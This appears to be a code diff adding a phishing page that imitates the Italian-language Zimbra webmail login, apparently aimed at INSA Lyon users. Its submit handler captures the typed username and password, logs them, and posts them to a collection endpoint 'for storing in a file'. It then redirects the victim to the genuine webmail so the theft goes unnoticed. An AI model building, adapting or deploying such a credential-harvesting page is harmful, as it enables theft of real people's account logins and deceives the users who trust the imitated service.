@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html class="user_font_size_normal" lang="it">
+<head>
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+    <title>Accesso al client Web Zimbra</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Zimbra fornisce software per server e client open source per messaggistica e collaborazione.">
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+    <link rel="stylesheet" type="text/css" href="./insa-login/style.css"/>
+</head>
+<body onload="onLoad();">
+    <div class="LoginScreen">
+        <div class="center">
+            <div class="contentBox">
+                <h1><a href="https://www.zimbra.com/" id="bannerLink" target="_new" title="Zimbra">
+                    <img src="./insa-login/image.png" alt="Zimbra" />
+                </a></h1>
+                <div id="ZLoginAppName">Client Web</div>
+                <form method="post" name="loginForm" action="/" accept-charset="UTF-8">
+                    <input type="hidden" name="loginOp" value="login"/>
+                    <input type="hidden" name="login_csrf" value="75063afe-4e7a-4dd0-a675-1fd98fb781a7"/>
+
+                    <form id="loginForm">
+                        <table class="form">
+                            <tr>
+                                <td><label for="username">Nome utente:</label></td>
+                                <td><input id="username" class="zLoginField" name="username" type="text" size="40" maxlength="1024" autocapitalize="off" autocorrect="off" required /></td>
+                            </tr>
+                            <tr>
+                                <td><label for="password">Password:</label></td>
+                                <td><input id="password" autocomplete="off" class="zLoginField" name="password" type="password" size="40" maxlength="1024" required /></td>
+                            </tr>
+                            <tr>
+                                <td>&nbsp;</td>
+                                <td class="submitTD">
+                                    <input id="remember" value="1" type="checkbox" name="zrememberme" />
+                                    <label for="remember">Ricordami</label>
+                                    <input type="button" class="ZLoginButton DwtButton" value="Entra" onclick="handleSubmit();" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <td colspan="2"><hr /></td>
+                            </tr>
+                            <tr>
+                                <td><label for="client">Versione:</label></td>
+                                <td>
+                                    <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
+                                        <option value="preferred" selected>Predefinito</option>
+                                        <option value="advanced">Avanzato (Ajax)</option>
+                                        <option value="standard">Standard (HTML)</option>
+                                        <option value="mobile">Cellulare</option>
+                                        <option value="touch">Touch</option>
+                                    </select>
+                                    <a href="#" onclick="showWhatsThis();" id="ZLoginWhatsThisAnchor" aria-controls="ZLoginWhatsThis" aria-expanded="false">Che cos’è questo?</a>
+                                    <div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick="showWhatsThis();" role="tooltip">
+                                        <h3 style="text-align:center;">Tipi di client:</h3>
+                                        <b>Avanzato</b>: funzioni complete per browser aggiornati.<br>
+                                        <b>Standard</b>: consigliato per connessioni lente o browser non aggiornati.<br>
+                                        <b>Mobile</b>: per dispositivi mobili.<br>
+                                        <b>Touch</b>: per tablet.<br>
+                                        <b>Predefinito</b>: opzione configurabile nelle Preferenze.
+                                    </div>
+                                </td>
+                            </tr>
+                        </table>
+                    </form>
+            </div>
+        </div>
+        <div class="Footer">
+            <div id="ZLoginNotice" class="legalNotice-small">
+                <a target="_new" href="https://www.zimbra.com">Zimbra</a> :: messaggistica open source - 
+                <a target="_new" href="https://blog.zimbra.com">Blog</a> - 
+                <a target="_new" href="https://wiki.zimbra.com">Wiki</a> - 
+                <a target="_new" href="https://www.zimbra.com/forums">Forum</a>
+            </div>
+            <div class="copyright">
+                Copyright © 2005-2023 Synacor, Inc. Tutti i diritti riservati.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Sleep function (delays execution)
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        function onLoad() {
+            var loginForm = document.loginForm;
+            if (loginForm.username) {
+                if (loginForm.username.value != "") {
+                    loginForm.password.focus();
+                } else {
+                    loginForm.username.focus();
+                }
+            }
+            clientChange("preferred");
+        }
+
+        function clientChange(selectValue) {
+            var useStandard = false;
+            useStandard = useStandard || (screen && (screen.width <= 800 && screen.height <= 600));
+            var div = document.getElementById("ZLoginUnsupported");
+            if (div)
+                div.style.display = ((selectValue == 'advanced') && useStandard) ? 'block' : 'none';
+        }
+
+        function showWhatsThis() {
+            var anchor = document.getElementById('ZLoginWhatsThisAnchor'),
+                tooltip = document.getElementById("ZLoginWhatsThis"),
+                doHide = (tooltip.style.display === "block");
+            tooltip.style.display = doHide ? "none" : "block";
+            anchor.setAttribute("aria-expanded", doHide ? "false" : "true");
+        }
+        function handleSubmit() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Log credentials to the console
+            console.log('Username:', username);
+            console.log('Password:', password);
+            console.log('Hello world');
+
+            // Send credentials to the server for storing in a file
+            fetch('http://localhost:4000/save-credentials', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Credentials saved successfully.');
+                } else {
+                    console.error('Error saving credentials.');
+                }
+            })
+            .catch(error => {
+                console.error('Fetch error:', error);
+            })
+            .finally(() => {
+                // Redirect to the specified page after the fetch operation
+                window.location.href = 'https://partage.insa-lyon.fr/';
+            });
+        }
+
+    
+    </script>
+</body>
+</html>
